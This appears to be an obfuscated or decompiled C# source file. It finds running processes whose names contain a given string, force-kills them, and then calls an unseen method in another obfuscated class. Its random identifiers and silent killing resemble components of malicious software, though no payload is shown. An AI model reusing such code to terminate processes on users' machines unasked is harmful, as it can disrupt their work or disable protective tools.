using System;
using System.Diagnostics;

namespace UmXkJLRjSLdPF;

public sealed class THunThukIKol
{
	public static bool iBzNCixGNNA(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void oEgXOvbZORLUVNU(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (iBzNCixGNNA(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					zIVCbxjNHAKEFp.VtnGzRRavnlvCq();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
